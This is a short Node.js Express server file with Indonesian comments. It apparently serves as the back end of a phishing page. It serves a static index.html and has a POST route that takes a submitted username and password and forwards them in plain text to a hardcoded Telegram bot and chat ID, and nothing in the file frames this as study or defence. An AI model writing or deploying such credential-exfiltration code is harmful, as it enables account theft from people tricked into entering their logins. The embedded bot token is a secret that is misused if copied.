import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const port = 3000;

// Mendapatkan path direktori file
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Ganti dengan token bot Telegram Anda
const TELEGRAM_BOT_TOKEN = '7256410617:AAE7jSC5Yy7yuP1ayTyjQU7drKYTfsnLC-A';
// Ganti dengan ID chat Telegram Anda
const TELEGRAM_CHAT_ID = '5046106367';

// Middleware untuk parsing JSON
app.use(bodyParser.json());

// Middleware untuk menyajikan file statis dari direktori saat ini
app.use(express.static(__dirname));

// Rute untuk menyajikan file index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rute POST untuk mengirim data ke Telegram
app.post('/sendToTelegram', (req, res) => {
    const { username, password } = req.body;

    const message = `Username/Email: ${username}\nPassword: ${password}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.status(200).send('Message sent!');
        } else {
            res.status(500).send('Failed to send message');
        }
    })
    .catch(error => {
        res.status(500).send('Error: ' + error.message);
    });
});

// Mulai server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
